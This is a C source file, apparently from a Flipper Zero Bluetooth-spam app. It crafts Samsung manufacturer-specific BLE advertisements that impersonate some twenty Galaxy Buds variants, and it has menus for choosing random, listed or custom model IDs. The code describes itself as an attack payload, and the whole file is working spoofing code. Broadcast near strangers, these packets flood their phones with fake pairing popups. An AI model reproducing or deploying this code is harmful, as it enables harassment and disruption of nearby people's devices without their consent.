#include "smartthings.h"
#include "_protocols.h"

// Hacked together by @Willy-JL and @Spooks4576
// Research by @Spooks4576

const struct {
    uint32_t value;
    const char* name;
} datas[] = {
    {0x39EA48, "Light Purple Buds"},    {0xA7C62C, "Bluish Silver Buds"},
    {0x850116, "Black Buds Live"},      {0x3D8F41, "Gray and Black Buds"},
    {0x3B6D02, "Bluish Chrome Buds"},   {0xAE063C, "Grey Beige Buds"},
    {0xB8B905, "Pure White Buds V2"},   {0xEAAA17, "Pure White Buds"},
    {0xD30704, "Black Buds V2"},        {0x101F1A, "Dark Purple Buds Live"},
    {0x9DB006, "French Flag Buds V2"},  {0x859608, "Dark Blue Buds V2"},
    {0x8E4503, "Pink Buds V2"},         {0x2C6740, "White and Black Buds"},
    {0x3F6718, "Bronze Buds Live"},     {0x42C519, "Red Buds Live"},
    {0xAE073A, "Black and White Buds"}, {0x011716, "Sleek Black Buds"},
    {0x9D1700, "Fallback Image"},       {0xEE7A0C, "Fallback Buds"},
};
const uint8_t datas_count = COUNT_OF(datas);

const char* smartthings_get_name(const ProtocolCfg* _cfg) {
    const SmartthingsCfg* cfg = &_cfg->smartthings;
    UNUSED(cfg);
    return "SmartThings";
}

void smartthings_make_packet(uint8_t* out_size, uint8_t** out_packet, const ProtocolCfg* _cfg) {
    const SmartthingsCfg* cfg = _cfg ? &_cfg->smartthings : NULL;

    uint32_t data;
    if(cfg && cfg->data != 0x000000) {
        data = cfg->data;
    } else {
        data = datas[rand() % datas_count].value;
    }

    uint8_t size = 31;
    uint8_t* packet = malloc(size);
    uint8_t i = 0;

    packet[i++] = 27; // Size
    packet[i++] = 0xFF; // AD Type (Manufacturer Specific)
    packet[i++] = 0x75; // Company ID (Samsung Electronics Co. Ltd.)
    packet[i++] = 0x00; // ...
    packet[i++] = 0x42;
    packet[i++] = 0x09;
    packet[i++] = 0x81;
    packet[i++] = 0x02;
    packet[i++] = 0x14;
    packet[i++] = 0x15;
    packet[i++] = 0x03;
    packet[i++] = 0x21;
    packet[i++] = 0x01;
    packet[i++] = 0x00;
    packet[i++] = (data >> 0x10) & 0xFF;
    packet[i++] = (data >> 0x08) & 0xFF;
    packet[i++] = 0x01;
    packet[i++] = (data >> 0x00) & 0xFF;
    packet[i++] = 0x06;
    packet[i++] = 0x3C;
    packet[i++] = 0x00;
    packet[i++] = 0x00;
    packet[i++] = 0x00;
    packet[i++] = 0x00;
    packet[i++] = 0x00;
    packet[i++] = 0x00;
    packet[i++] = 0x00;
    packet[i++] = 0x00;

    packet[i++] = 16; // Size
    packet[i++] = 0xFF; // AD Type (Manufacturer Specific)
    packet[i++] = 0x75; // Company ID (Samsung Electronics Co. Ltd.)
    // Truncated AD segment, Android seems to fill in the rest with zeros

    *out_size = size;
    *out_packet = packet;
}

enum {
    ConfigData,
};
static void config_callback(void* _ctx, uint32_t index) {
    Ctx* ctx = _ctx;
    scene_manager_set_scene_state(ctx->scene_manager, SceneConfig, index);
    switch(index) {
    case ConfigData:
        scene_manager_next_scene(ctx->scene_manager, SceneSmartthingsData);
    default:
        break;
    }
}
static void data_changed(VariableItem* item) {
    SmartthingsCfg* cfg = variable_item_get_context(item);
    uint8_t index = variable_item_get_current_value_index(item);
    if(index) {
        index--;
        cfg->data = datas[index].value;
        variable_item_set_current_value_text(item, datas[index].name);
    } else {
        cfg->data = 0x000000;
        variable_item_set_current_value_text(item, "Random");
    }
}
static uint8_t smartthings_config_list(Ctx* ctx) {
    SmartthingsCfg* cfg = &ctx->attack->payload.cfg.smartthings;
    VariableItemList* list = ctx->variable_item_list;
    uint8_t item_count = 0;
    VariableItem* item;
    size_t value_index;

    item_count++;
    item = variable_item_list_add(list, "Data", datas_count + 1, data_changed, cfg);
    const char* data_name = NULL;
    char data_name_buf[9];
    if(cfg->data == 0x000000) {
        data_name = "Random";
        value_index = 0;
    } else {
        for(uint8_t i = 0; i < datas_count; i++) {
            if(cfg->data == datas[i].value) {
                data_name = datas[i].name;
                value_index = i + 1;
                break;
            }
        }
        if(!data_name) {
            snprintf(data_name_buf, sizeof(data_name_buf), "%06lX", cfg->data);
            data_name = data_name_buf;
            value_index = datas_count + 1;
        }
    }
    variable_item_set_current_value_index(item, value_index);
    variable_item_set_current_value_text(item, data_name);

    variable_item_list_set_enter_callback(list, config_callback, ctx);

    return item_count;
}

const Protocol protocol_smartthings = {
    .icon = &I_android,
    .get_name = smartthings_get_name,
    .make_packet = smartthings_make_packet,
    .config_list = smartthings_config_list,
};

static void data_callback(void* _ctx, uint32_t index) {
    Ctx* ctx = _ctx;
    SmartthingsCfg* cfg = &ctx->attack->payload.cfg.smartthings;
    switch(index) {
    case 0:
        cfg->data = 0x000000;
        scene_manager_previous_scene(ctx->scene_manager);
        break;
    case datas_count + 1:
        scene_manager_next_scene(ctx->scene_manager, SceneSmartthingsDataCustom);
        break;
    default:
        cfg->data = datas[index - 1].value;
        scene_manager_previous_scene(ctx->scene_manager);
        break;
    }
}
void scene_smartthings_data_on_enter(void* _ctx) {
    Ctx* ctx = _ctx;
    SmartthingsCfg* cfg = &ctx->attack->payload.cfg.smartthings;
    Submenu* submenu = ctx->submenu;
    uint32_t selected = 0;
    bool found = false;
    submenu_reset(submenu);

    submenu_add_item(submenu, "Random", 0, data_callback, ctx);
    if(cfg->data == 0x000000) {
        found = true;
        selected = 0;
    }
    for(uint8_t i = 0; i < datas_count; i++) {
        submenu_add_item(submenu, datas[i].name, i + 1, data_callback, ctx);
        if(!found && cfg->data == datas[i].value) {
            found = true;
            selected = i + 1;
        }
    }
    submenu_add_item(submenu, "Custom", datas_count + 1, data_callback, ctx);
    if(!found) {
        found = true;
        selected = datas_count + 1;
    }

    submenu_set_selected_item(submenu, selected);

    view_dispatcher_switch_to_view(ctx->view_dispatcher, ViewSubmenu);
}
bool scene_smartthings_data_on_event(void* _ctx, SceneManagerEvent event) {
    UNUSED(_ctx);
    UNUSED(event);
    return false;
}
void scene_smartthings_data_on_exit(void* _ctx) {
    UNUSED(_ctx);
}

static void data_custom_callback(void* _ctx) {
    Ctx* ctx = _ctx;
    scene_manager_previous_scene(ctx->scene_manager);
    scene_manager_previous_scene(ctx->scene_manager);
}
void scene_smartthings_data_custom_on_enter(void* _ctx) {
    Ctx* ctx = _ctx;
    SmartthingsCfg* cfg = &ctx->attack->payload.cfg.smartthings;
    ByteInput* byte_input = ctx->byte_input;

    byte_input_set_header_text(byte_input, "Enter custom Data");

    ctx->byte_store[0] = (cfg->data >> 0x10) & 0xFF;
    ctx->byte_store[1] = (cfg->data >> 0x08) & 0xFF;
    ctx->byte_store[2] = (cfg->data >> 0x00) & 0xFF;

    byte_input_set_result_callback(
        byte_input, data_custom_callback, NULL, ctx, (void*)ctx->byte_store, 3);

    view_dispatcher_switch_to_view(ctx->view_dispatcher, ViewByteInput);
}
bool scene_smartthings_data_custom_on_event(void* _ctx, SceneManagerEvent event) {
    UNUSED(_ctx);
    UNUSED(event);
    return false;
}
void scene_smartthings_data_custom_on_exit(void* _ctx) {
    Ctx* ctx = _ctx;
    SmartthingsCfg* cfg = &ctx->attack->payload.cfg.smartthings;
    cfg->data =
        (ctx->byte_store[0] << 0x10) + (ctx->byte_store[1] << 0x08) + (ctx->byte_store[2] << 0x00);
}
